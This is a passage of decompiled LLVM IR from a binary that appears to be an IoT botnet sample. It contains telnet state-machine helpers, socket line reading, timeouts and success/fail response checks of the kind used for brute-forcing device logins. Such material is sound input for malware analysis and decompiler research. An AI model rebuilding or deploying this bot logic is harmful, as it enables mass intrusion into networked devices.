dec_label_pc_10001be0:                            ; preds = %dec_label_pc_10001bcc
  %v2_10001be4 = load i8, i8* %storemerge2, align 1
  %v3_10001bec = icmp eq i8 %v2_10001be4, 9
  br i1 %v3_10001bec, label %dec_label_pc_10001bc0, label %dec_label_pc_10001bf4

dec_label_pc_10001bf4:                            ; preds = %dec_label_pc_10001be0
  %v2_10001bf8 = load i8, i8* %storemerge2, align 1
  %v3_10001c00 = icmp eq i8 %v2_10001bf8, 58
  br i1 %v3_10001c00, label %dec_label_pc_10001bc0, label %dec_label_pc_10001c34.preheader

dec_label_pc_10001c34.preheader:                  ; preds = %dec_label_pc_10001bf4
  %v2_10001c4c = add i32 %v4_10001bcc, -1
  br label %dec_label_pc_10001c34

dec_label_pc_10001c0c:                            ; preds = %dec_label_pc_10001c64, %dec_label_pc_10001c34
  store i32 %v4_10001bcc, i32* @r3, align 4
  %v0_10001c14 = call i32 @__GI_strlen()
  %v1_10001c28 = add i32 %v0_10001c14, %v2_10001c4c
  %v3_10001c30 = inttoptr i32 %v1_10001c28 to i8*
  store i8 0, i8* %v3_10001c30, align 1
  br label %dec_label_pc_10001c34

dec_label_pc_10001c34:                            ; preds = %dec_label_pc_10001c34.preheader, %dec_label_pc_10001c0c
  store i32 %v4_10001bcc, i32* @r3, align 4
  %v0_10001c3c = call i32 @__GI_strlen()
  %v1_10001c50 = add i32 %v0_10001c3c, %v2_10001c4c
  %v1_10001c54 = inttoptr i32 %v1_10001c50 to i8*
  %v2_10001c54 = load i8, i8* %v1_10001c54, align 1
  %v3_10001c5c = icmp eq i8 %v2_10001c54, 13
  br i1 %v3_10001c5c, label %dec_label_pc_10001c0c, label %dec_label_pc_10001c64

dec_label_pc_10001c64:                            ; preds = %dec_label_pc_10001c34
  store i32 %v4_10001bcc, i32* @r3, align 4
  %v0_10001c6c = call i32 @__GI_strlen()
  %v1_10001c80 = add i32 %v0_10001c6c, %v2_10001c4c
  %v1_10001c84 = inttoptr i32 %v1_10001c80 to i8*
  %v2_10001c84 = load i8, i8* %v1_10001c84, align 1
  %v3_10001c8c = icmp eq i8 %v2_10001c84, 10
  br i1 %v3_10001c8c, label %dec_label_pc_10001c0c, label %dec_label_pc_10001c94

dec_label_pc_10001c94:                            ; preds = %dec_label_pc_10001c64
  store i32 %v4_10001bcc, i32* @r3, align 4
  store i32 268442788, i32* @lr, align 4
  %v2_10001ca0 = call i32 @__GI_strchr(i32 %v4_10001bcc, i32 46)
  %v3_10001ca8 = icmp eq i32 %v2_10001ca0, 0
  br i1 %v3_10001ca8, label %dec_label_pc_10001ccc, label %dec_label_pc_10001cb0

dec_label_pc_10001cb0:                            ; preds = %dec_label_pc_10001c94
  store i32 %v4_10001bcc, i32* @r3, align 4
  store i32 268442816, i32* @lr, align 4
  %v2_10001cbc = call i32 @__GI_strchr(i32 %v4_10001bcc, i32 46)
  %v3_10001cc8 = inttoptr i32 %v2_10001cbc to i8*
  store i8 0, i8* %v3_10001cc8, align 1
  br label %dec_label_pc_10001ccc

dec_label_pc_10001ccc:                            ; preds = %dec_label_pc_10001c94, %dec_label_pc_10001cb0
  %v3_10001cdc = call i32 @strcpy(i32 %arg1, i8* %storemerge2)
  store i32 ptrtoint (i32* @global_var_10001ce8.26 to i32), i32* @lr, align 4
  %v1_10001ce4 = call i32 @__libc_close(i32 %v3_10001b6c)
  br label %dec_label_pc_10001d3c

dec_label_pc_10001cf4:                            ; preds = %dec_label_pc_10001b7c
  store i32 268442892, i32* @lr, align 4
  %v3_10001d08 = call i32 @__GI_memset(i32 %v2_10001d0c, i32 0, i32 4096)
  br label %dec_label_pc_10001d0c

dec_label_pc_10001d0c:                            ; preds = %entry, %dec_label_pc_10001cf4
  %v3_10001d1c = call i32 @fdgets(i32 %v2_10001d0c, i32 4096, i32 %v3_10001b6c)
  %v3_10001d24 = icmp eq i32 %v3_10001d1c, 0
  br i1 %v3_10001d24, label %dec_label_pc_10001d2c, label %dec_label_pc_10001b7c

dec_label_pc_10001d2c:                            ; preds = %dec_label_pc_10001d0c
  store i32 ptrtoint (i32* @global_var_10001d34.27 to i32), i32* @lr, align 4
  %v1_10001d30 = call i32 @__libc_close(i32 %v3_10001b6c)
  br label %dec_label_pc_10001d3c

dec_label_pc_10001d3c:                            ; preds = %dec_label_pc_10001ccc, %dec_label_pc_10001d2c
  %storemerge = phi i32 [ 1, %dec_label_pc_10001d2c ], [ 0, %dec_label_pc_10001ccc ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_10001bcc, { 1, 0, 3, 2, 4, 7, 5, 6, 8 }
  uselistorder i8* %storemerge2, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_10001d0c, { 3, 0, 1, 2 }
  uselistorder i32 %v3_10001b6c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10001d3c, { 1, 0 }
  uselistorder label %dec_label_pc_10001d0c, { 1, 0 }
  uselistorder label %dec_label_pc_10001ccc, { 1, 0 }
  uselistorder label %dec_label_pc_10001c34, { 1, 0 }
  uselistorder label %dec_label_pc_10001bcc, { 1, 0 }
}

define i32 @getCores() local_unnamed_addr {
entry:
  %stack_var_-4112 = alloca i32, align 4
  store i32 268443020, i32* @lr, align 4
  %v3_10001d88 = call i32 @__libc_open(i32 ptrtoint ([14 x i8]* @global_var_10015634.24 to i32), i32 0)
  %v2_10001dec = ptrtoint i32* %stack_var_-4112 to i32
  %v1_10001da0 = bitcast i32* %stack_var_-4112 to i8*
  br label %dec_label_pc_10001dec

dec_label_pc_10001d98:                            ; preds = %dec_label_pc_10001dec
  store i32 268443044, i32* @lr, align 4
  %v2_10001da0 = call i32 @uppercase(i8* %v1_10001da0)
  store i32 268443064, i32* @lr, align 4
  %v5_10001db4 = call i32 @strstr(i32 %v2_10001dec, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10015644.25, i32 0, i32 0), i32 268500992)
  %v4_10001dc0 = icmp eq i32 %v5_10001db4, %v2_10001dec
  br i1 %v4_10001dc0, label %dec_label_pc_10001dc8, label %dec_label_pc_10001dd4

dec_label_pc_10001dc8:                            ; preds = %dec_label_pc_10001d98
  %v1_10001dcc = add i32 %stack_var_-4116.1, 1
  br label %dec_label_pc_10001dd4

dec_label_pc_10001dd4:                            ; preds = %dec_label_pc_10001d98, %dec_label_pc_10001dc8
  %stack_var_-4116.0 = phi i32 [ %v1_10001dcc, %dec_label_pc_10001dc8 ], [ %stack_var_-4116.1, %dec_label_pc_10001d98 ]
  store i32 268443116, i32* @lr, align 4
  %v3_10001de8 = call i32 @__GI_memset(i32 %v2_10001dec, i32 0, i32 4096)
  br label %dec_label_pc_10001dec

dec_label_pc_10001dec:                            ; preds = %entry, %dec_label_pc_10001dd4
  %stack_var_-4116.1 = phi i32 [ 0, %entry ], [ %stack_var_-4116.0, %dec_label_pc_10001dd4 ]
  %v3_10001dfc = call i32 @fdgets(i32 %v2_10001dec, i32 4096, i32 %v3_10001d88)
  %v3_10001e04 = icmp eq i32 %v3_10001dfc, 0
  br i1 %v3_10001e04, label %dec_label_pc_10001e0c, label %dec_label_pc_10001d98

dec_label_pc_10001e0c:                            ; preds = %dec_label_pc_10001dec
  store i32 268443156, i32* @lr, align 4
  %v1_10001e10 = call i32 @__libc_close(i32 %v3_10001d88)
  ret i32 %stack_var_-4116.1

; uselistorder directives
  uselistorder i32 %stack_var_-4116.1, { 0, 2, 1 }
  uselistorder i32 %v2_10001dec, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10001dec, { 1, 0 }
  uselistorder label %dec_label_pc_10001dd4, { 1, 0 }
}

define i32 @makeRandomStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_10001e4c = load i32, i32* %r3.global-to-local, align 4
  %v2_10001ecc4 = icmp sgt i32 %arg2, 0
  br i1 %v2_10001ecc4, label %dec_label_pc_10001e68, label %dec_label_pc_10001ed4

dec_label_pc_10001e68:                            ; preds = %entry, %dec_label_pc_10001e68
  %storemerge37 = phi i32 [ %v1_10001ebc, %dec_label_pc_10001e68 ], [ 0, %entry ]
  %v2_10001e74 = add i32 %storemerge37, %v0_10001e4c
  %v0_10001e78 = call i32 @rand_cmwc()
  store i32 %v0_10001e78, i32* %r3.global-to-local, align 4
  %v1_10001e8c = urem i32 %v0_10001e78, 26
  %fold = add nuw nsw i32 %v1_10001e8c, 65
  %v1_10001eb4 = trunc i32 %fold to i8
  %v3_10001eb4 = inttoptr i32 %v2_10001e74 to i8*
  store i8 %v1_10001eb4, i8* %v3_10001eb4, align 1
  %v1_10001ebc = add nuw nsw i32 %storemerge37, 1
  %v2_10001ecc = icmp slt i32 %v1_10001ebc, %arg2
  br i1 %v2_10001ecc, label %dec_label_pc_10001e68, label %dec_label_pc_10001ec4.dec_label_pc_10001ed4_crit_edge

dec_label_pc_10001ec4.dec_label_pc_10001ed4_crit_edge: ; preds = %dec_label_pc_10001e68
  %v0_10001eec.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10001ed4

dec_label_pc_10001ed4:                            ; preds = %dec_label_pc_10001ec4.dec_label_pc_10001ed4_crit_edge, %entry
  %v0_10001eec = phi i32 [ %v0_10001eec.pre, %dec_label_pc_10001ec4.dec_label_pc_10001ed4_crit_edge ], [ %v0_10001e4c, %entry ]
  ret i32 %v0_10001eec

; uselistorder directives
  uselistorder i32 %v1_10001ebc, { 1, 0 }
  uselistorder i32 %storemerge37, { 1, 0 }
  uselistorder i32 %v0_10001e4c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10001e68, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i8, align 1
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10001f28.28 to i32), i32* @lr, align 4
  %v4_10001f24 = call i32 @__GI_memset(i32 %tmp, i32 0, i32 %arg3)
  store i32 30, i32* %stack_var_-40, align 4
  %v2_10001f38 = ptrtoint i32* %stack_var_-168 to i32
  br label %dec_label_pc_10001f4c

dec_label_pc_10001f4c:                            ; preds = %entry, %dec_label_pc_10001f4c
  %storemerge517 = phi i32 [ 0, %entry ], [ %v1_10001f68, %dec_label_pc_10001f4c ]
  %v1_10001f54 = mul nuw nsw i32 %storemerge517, 4
  %v2_10001f58 = add i32 %v1_10001f54, %v2_10001f38
  %v2_10001f60 = inttoptr i32 %v2_10001f58 to i32*
  store i32 0, i32* %v2_10001f60, align 4
  %v1_10001f68 = add nuw nsw i32 %storemerge517, 1
  %tmp41 = icmp ult i32 %v1_10001f68, 32
  br i1 %tmp41, label %dec_label_pc_10001f4c, label %dec_label_pc_10001f7c

dec_label_pc_10001f7c:                            ; preds = %dec_label_pc_10001f4c
  %v1_10001f80 = udiv i32 %arg1, 32
  %v1_10001f88 = mul nuw nsw i32 %v1_10001f80, 4
  %v2_10001f8c = ptrtoint i32* %stack_var_-200 to i32
  %v2_10001f90 = add nuw nsw i32 %v1_10001f88, 32
  %v1_10001f94 = add i32 %v2_10001f90, %v2_10001f8c
  %v1_10001f98 = inttoptr i32 %v1_10001f94 to i32*
  %v2_10001f98 = load i32, i32* %v1_10001f98, align 4
  %v1_10001fa0 = urem i32 %arg1, 32
  %v3_10001fa8 = shl i32 1, %v1_10001fa0
  %v2_10001fac = or i32 %v2_10001f98, %v3_10001fa8
  store i32 %v2_10001fac, i32* %v1_10001f98, align 4
  %v1_10001fc8 = add i32 %arg1, 1
  %v2_10001fd4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268443632, i32* @lr, align 4
  %v5_10001fec = call i32 @__libc_select(i32 %v1_10001fc8, i32 %v2_10001f38, i32 0, i32 %v2_10001f38, i32 %v2_10001fd4)
  %v2_10001ffc = icmp sgt i32 %v5_10001fec, 0
  br i1 %v2_10001ffc, label %dec_label_pc_100021a8.preheader, label %dec_label_pc_1000210c.preheader

dec_label_pc_1000210c.preheader:                  ; preds = %dec_label_pc_10001f7c
  %tmp42 = icmp slt i32 %tmp24, 10
  br i1 %tmp42, label %dec_label_pc_10002008, label %dec_label_pc_100021a8.preheader

dec_label_pc_10002008:                            ; preds = %dec_label_pc_1000210c.preheader, %dec_label_pc_10002100
  %stack_var_-176.016 = phi i32 [ %v1_10002104, %dec_label_pc_10002100 ], [ %tmp24, %dec_label_pc_1000210c.preheader ]
  %v3_1000200c = load i32, i32* @global_var_100287d0.29, align 4
  store i32 ptrtoint (i32* @global_var_10002024.31 to i32), i32* @lr, align 4
  %v4_10002020 = call i32 @sockprintf(i32 %v3_1000200c, i32 ptrtoint ([5 x i8]* @global_var_10015650.30 to i32), i32 268500992)
  store i32 30, i32* %stack_var_-40, align 4
  store i32 %v2_10001f38, i32* %stack_var_-200, align 4
  store i32 0, i32* %stack_var_-168, align 4
  br label %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge

dec_label_pc_10002048.dec_label_pc_10002048_crit_edge: ; preds = %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge.dec_label_pc_10002048.dec_label_pc_10002048_crit_edge_crit_edge, %dec_label_pc_10002008
  %v3_1000204c.pre = phi i32 [ %v2_10001f38, %dec_label_pc_10002008 ], [ %v3_1000204c.pre.pre, %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge.dec_label_pc_10002048.dec_label_pc_10002048_crit_edge_crit_edge ]
  %v1_1000206448 = phi i32 [ 1, %dec_label_pc_10002008 ], [ %v1_10002064, %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge.dec_label_pc_10002048.dec_label_pc_10002048_crit_edge_crit_edge ]
  %v1_10002050 = mul nuw nsw i32 %v1_1000206448, 4
  %v2_10002054 = add i32 %v1_10002050, %v3_1000204c.pre
  %v2_1000205c = inttoptr i32 %v2_10002054 to i32*
  store i32 0, i32* %v2_1000205c, align 4
  %v1_10002064 = add nuw nsw i32 %v1_1000206448, 1
  %tmp43 = icmp ult i32 %v1_10002064, 32
  br i1 %tmp43, label %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge.dec_label_pc_10002048.dec_label_pc_10002048_crit_edge_crit_edge, label %dec_label_pc_10002078

dec_label_pc_10002048.dec_label_pc_10002048_crit_edge.dec_label_pc_10002048.dec_label_pc_10002048_crit_edge_crit_edge: ; preds = %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge
  %v3_1000204c.pre.pre = load i32, i32* %stack_var_-200, align 4
  br label %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge

dec_label_pc_10002078:                            ; preds = %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge
  %v2_10002094 = load i32, i32* %v1_10001f98, align 4
  %v2_100020a8 = or i32 %v2_10002094, %v3_10001fa8
  store i32 %v2_100020a8, i32* %v1_10001f98, align 4
  store i32 268443884, i32* @lr, align 4
  %v5_100020e8 = call i32 @__libc_select(i32 %v1_10001fc8, i32 %v2_10001f38, i32 0, i32 %v2_10001f38, i32 %v2_10001fd4)
  %v2_100020f8 = icmp sgt i32 %v5_100020e8, 0
  br i1 %v2_100020f8, label %dec_label_pc_100021a8.preheader, label %dec_label_pc_10002100

dec_label_pc_10002100:                            ; preds = %dec_label_pc_10002078
  %v1_10002104 = add nsw i32 %stack_var_-176.016, 1
  %tmp44 = icmp slt i32 %v1_10002104, 10
  br i1 %tmp44, label %dec_label_pc_10002008, label %dec_label_pc_100021a8.preheader

dec_label_pc_100021a8.preheader:                  ; preds = %dec_label_pc_10002100, %dec_label_pc_10002078, %dec_label_pc_1000210c.preheader, %dec_label_pc_10001f7c
  %v2_10002134 = ptrtoint i8* %stack_var_-32 to i32
  br label %dec_label_pc_100021a8

dec_label_pc_1000212c:                            ; preds = %dec_label_pc_100021a8
  %v3_10002130 = load i32, i32* @global_var_100287d0.29, align 4
  store i32 268443980, i32* @lr, align 4
  %v4_10002148 = call i32 @__libc_recv(i32 %v3_10002130, i32 %v2_10002134, i32 1, i32 0)
  %v3_10002150 = icmp eq i32 %v4_10002148, 1
  br i1 %v3_10002150, label %dec_label_pc_10002170, label %dec_label_pc_10002158

dec_label_pc_10002158:                            ; preds = %dec_label_pc_1000212c
  store i8 0, i8* %stack_var_-180.0, align 1
  br label %dec_label_pc_100021e4

dec_label_pc_10002170:                            ; preds = %dec_label_pc_1000212c
  %v3_10002170 = load i8, i8* %stack_var_-32, align 1
  %v4_10002178 = ptrtoint i8* %stack_var_-180.0 to i32
  store i8 %v3_10002170, i8* %stack_var_-180.0, align 1
  %v1_10002184 = add i32 %v4_10002178, 1
  %v5_10002188 = inttoptr i32 %v1_10002184 to i8*
  %v3_1000218c = load i8, i8* %stack_var_-32, align 1
  %v3_10002194 = icmp eq i8 %v3_1000218c, 10
  br i1 %v3_10002194, label %dec_label_pc_100021d0, label %dec_label_pc_1000219c

dec_label_pc_1000219c:                            ; preds = %dec_label_pc_10002170
  %v1_100021a0 = add i32 %stack_var_-184.0, 1
  br label %dec_label_pc_100021a8

dec_label_pc_100021a8:                            ; preds = %dec_label_pc_100021a8.preheader, %dec_label_pc_1000219c
  %stack_var_-180.0 = phi i8* [ %v5_10002188, %dec_label_pc_1000219c ], [ %arg2, %dec_label_pc_100021a8.preheader ]
  %stack_var_-184.0 = phi i32 [ %v1_100021a0, %dec_label_pc_1000219c ], [ 0, %dec_label_pc_100021a8.preheader ]
  %v0_100021b0 = call i32 @__asm_mfcr()
  %v1_100021b4 = call i32 @__asm_rlwinm(i32 %v0_100021b0, i32 30, i32 31, i32 31)
  %v1_100021b8 = urem i32 %v1_100021b4, 256
  %v3_100021c8 = icmp eq i32 %v1_100021b8, 0
  br i1 %v3_100021c8, label %dec_label_pc_100021d0, label %dec_label_pc_1000212c

dec_label_pc_100021d0:                            ; preds = %dec_label_pc_100021a8, %dec_label_pc_10002170
  %stack_var_-180.1 = phi i8* [ %stack_var_-180.0, %dec_label_pc_100021a8 ], [ %v5_10002188, %dec_label_pc_10002170 ]
  store i8 0, i8* %stack_var_-180.1, align 1
  br label %dec_label_pc_100021e4

dec_label_pc_100021e4:                            ; preds = %dec_label_pc_10002158, %dec_label_pc_100021d0
  %storemerge = phi i32 [ -1, %dec_label_pc_10002158 ], [ %stack_var_-184.0, %dec_label_pc_100021d0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-180.0, { 3, 0, 1, 2 }
  uselistorder i8* %v5_10002188, { 1, 0 }
  uselistorder i32 %v1_10002104, { 1, 0 }
  uselistorder i32 %v1_10002064, { 1, 0 }
  uselistorder i32 %v2_10001fd4, { 1, 0 }
  uselistorder i32* %v1_10001f98, { 1, 2, 0, 3 }
  uselistorder i32 %storemerge517, { 1, 0 }
  uselistorder i32 %v2_10001f38, { 5, 4, 0, 6, 3, 2, 1 }
  uselistorder i32* %stack_var_-40, { 0, 2, 1 }
  uselistorder i8* %stack_var_-32, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100021e4, { 1, 0 }
  uselistorder label %dec_label_pc_100021a8, { 1, 0 }
  uselistorder label %dec_label_pc_10002008, { 1, 0 }
  uselistorder label %dec_label_pc_10001f4c, { 1, 0 }
}

define i32 @get_telstate_host(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v1_10002220 = add i32 %arg1, 4
  %v2_10002220 = inttoptr i32 %v1_10002220 to i32*
  %v3_10002220 = load i32, i32* %v2_10002220, align 4
  store i32 %v3_10002220, i32* %stack_var_-20, align 4
  store i32 268444220, i32* @lr, align 4
  %v3_10002238 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-20, i32 %arg1)
  ret i32 %v3_10002238
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  store i32 268444316, i32* @lr, align 4
  %v4_10002298 = call i32 @__GI_memset(i32 %tmp, i32 0, i32 %arg4)
  %v5_100022b0 = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v3_100022c0 = load i8, i8* %arg3, align 1
  %v3_100022c8 = icmp eq i8 %v3_100022c0, -1
  br i1 %v3_100022c8, label %dec_label_pc_100022d0, label %dec_label_pc_100022e4

dec_label_pc_100022d0:                            ; preds = %entry
  store i32 268444388, i32* @lr, align 4
  %v6_100022e0 = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3, i32 %tmp)
  br label %dec_label_pc_100022e4

dec_label_pc_100022e4:                            ; preds = %entry, %dec_label_pc_100022d0
  %v3_100022f0 = call i32 @contains_string(i32 %tmp, i32 %arg5)
  %v3_100022f8 = icmp ne i32 %v3_100022f0, 0
  %. = zext i1 %v3_100022f8 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_100022e4, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_10002368 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_10002368, i32* %stack_var_-184, align 4
  store i32 0, i32* %stack_var_-176, align 4
  br label %dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge

dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge: ; preds = %dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge.dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge_crit_edge, %entry
  %v3_10002380.pre = phi i32 [ %v2_10002368, %entry ], [ %v3_10002380.pre.pre, %dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge.dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge_crit_edge ]
  %v1_1000239821 = phi i32 [ 1, %entry ], [ %v1_10002398, %dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge.dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge_crit_edge ]
  %v1_10002384 = mul nuw nsw i32 %v1_1000239821, 4
  %v2_10002388 = add i32 %v1_10002384, %v3_10002380.pre
  %v2_10002390 = inttoptr i32 %v2_10002388 to i32*
  store i32 0, i32* %v2_10002390, align 4
  %v1_10002398 = add nuw nsw i32 %v1_1000239821, 1
  %tmp19 = icmp ult i32 %v1_10002398, 32
  br i1 %tmp19, label %dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge.dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge_crit_edge, label %dec_label_pc_100023ac

dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge.dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge_crit_edge: ; preds = %dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge
  %v3_10002380.pre.pre = load i32, i32* %stack_var_-184, align 4
  br label %dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge

dec_label_pc_100023ac:                            ; preds = %dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge
  %v1_100023b0 = udiv i32 %arg1, 32
  %v1_100023b8 = mul nuw nsw i32 %v1_100023b0, 4
  %v2_100023bc = ptrtoint i32* %stack_var_-184 to i32
  %v2_100023c0 = add nuw nsw i32 %v1_100023b8, 8
  %v1_100023c4 = add i32 %v2_100023c0, %v2_100023bc
  %v1_100023c8 = inttoptr i32 %v1_100023c4 to i32*
  %v2_100023c8 = load i32, i32* %v1_100023c8, align 4
  %v1_100023d0 = urem i32 %arg1, 32
  %v3_100023d8 = shl i32 1, %v1_100023d0
  %v2_100023dc = or i32 %v2_100023c8, %v3_100023d8
  store i32 %v2_100023dc, i32* %v1_100023c8, align 4
  %v1_100023f8 = add i32 %arg1, 1
  %v2_10002400 = ptrtoint i32* %stack_var_-48 to i32
  store i32 268444700, i32* @lr, align 4
  %v5_10002418 = call i32 @__libc_select(i32 %v1_100023f8, i32 %v2_10002368, i32 0, i32 0, i32 %v2_10002400)
  %v2_10002420 = icmp sgt i32 %v5_10002418, 0
  br i1 %v2_10002420, label %dec_label_pc_10002434, label %dec_label_pc_10002454

dec_label_pc_10002434:                            ; preds = %dec_label_pc_100023ac
  store i32 268444748, i32* @lr, align 4
  %v4_10002448 = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_10002454

dec_label_pc_10002454:                            ; preds = %dec_label_pc_100023ac, %dec_label_pc_10002434
  %storemerge = phi i32 [ %v4_10002448, %dec_label_pc_10002434 ], [ 0, %dec_label_pc_100023ac ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_10002398, { 1, 0 }
  uselistorder i32 %v2_10002368, { 1, 0, 2 }
  uselistorder i32* %stack_var_-184, { 2, 0, 1 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_10002454, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_10002494 = icmp eq i32 %arg2, 0
  br i1 %v3_10002494, label %dec_label_pc_1000249c, label %dec_label_pc_100024ac

dec_label_pc_1000249c:                            ; preds = %entry
  %v2_100024a0 = load i32, i32* %arg1, align 4
  store i32 268444844, i32* @lr, align 4
  %v1_100024a8 = call i32 @__libc_close(i32 %v2_100024a0)
  br label %dec_label_pc_100024ac

dec_label_pc_100024ac:                            ; preds = %entry, %dec_label_pc_1000249c
  %v2_100024b4 = add i32 %tmp, 16
  %v3_100024b4 = inttoptr i32 %v2_100024b4 to i32*
  store i32 0, i32* %v3_100024b4, align 4
  %v1_100024c4 = trunc i32 %arg2 to i8
  %v3_100024c4 = add i32 %tmp, 8
  %v4_100024c4 = inttoptr i32 %v3_100024c4 to i8*
  store i8 %v1_100024c4, i8* %v4_100024c4, align 1
  %v1_100024cc = add i32 %tmp, 24
  %v2_100024cc = inttoptr i32 %v1_100024cc to i32*
  %v3_100024cc = load i32, i32* %v2_100024cc, align 4
  store i32 268444900, i32* @lr, align 4
  %v3_100024e0 = call i32 @__GI_memset(i32 %v3_100024cc, i32 0, i32 512)
  ret i32 %v3_100024e0

; uselistorder directives
  uselistorder label %dec_label_pc_100024ac, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1000251c = inttoptr i32 %arg1 to i32*
  %v3_1000251c = call i32 @advance_state(i32* %v2_1000251c, i32 0)
  %v3_10002528 = add i32 %arg1, 9
  %v4_10002528 = inttoptr i32 %v3_10002528 to i8*
  store i8 1, i8* %v4_10002528, align 1
  ret i32 %v3_1000251c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1000256c = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([3 x i8*]* @global_var_1002841c.35 to i32))
  ret i32 %v3_1000256c
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v3_100025b8 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_100283fc.43 to i32))
  ret i32 %v3_100025b8

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268445180, i32* @lr, align 4
  %v1_100025f8 = call i32 @contains_success(i32 %arg1)
  %v3_10002600 = icmp eq i32 %v1_100025f8, 0
  br i1 %v3_10002600, label %dec_label_pc_10002608, label %dec_label_pc_10002630

dec_label_pc_10002608:                            ; preds = %entry
  store i32 268445200, i32* @lr, align 4
  %v1_1000260c = call i32 @contains_fail(i32 %arg1)
  %v3_10002614 = icmp ne i32 %v1_1000260c, 0
  %. = zext i1 %v3_10002614 to i32
  br label %dec_label_pc_10002630

dec_label_pc_10002630:                            ; preds = %dec_label_pc_10002608, %entry
  %storemerge = phi i32 [ 1, %entry ], [ %., %dec_label_pc_10002608 ]
  ret i32 %storemerge
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_10002684

dec_label_pc_10002684:                            ; preds = %dec_label_pc_10002684, %entry
  %stack_var_-36.0 = phi i32 [ 0, %entry ], [ %v1_10002688, %dec_label_pc_10002684 ]
  %v1_10002688 = add i32 %stack_var_-36.0, 1
  %v1_10002694 = mul i32 %v1_10002688, 4
  %v2_100026a0 = add i32 %v1_10002694, %arg2
  %v1_100026a4 = inttoptr i32 %v2_100026a0 to i32*
  %v2_100026a4 = load i32, i32* %v1_100026a4, align 4
  %v3_100026a8 = icmp eq i32 %v2_100026a4, 0
  br i1 %v3_100026a8, label %dec_label_pc_10002708.preheader, label %dec_label_pc_10002684

dec_label_pc_10002708.preheader:                  ; preds = %dec_label_pc_10002684
  %v2_100027104 = icmp sgt i32 %v1_10002688, 0
  br i1 %v2_100027104, label %dec_label_pc_100026bc.lr.ph, label %dec_label_pc_10002720

dec_label_pc_100026bc.lr.ph:                      ; preds = %dec_label_pc_10002708.preheader
  %v3_100026e0 = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_100026bc

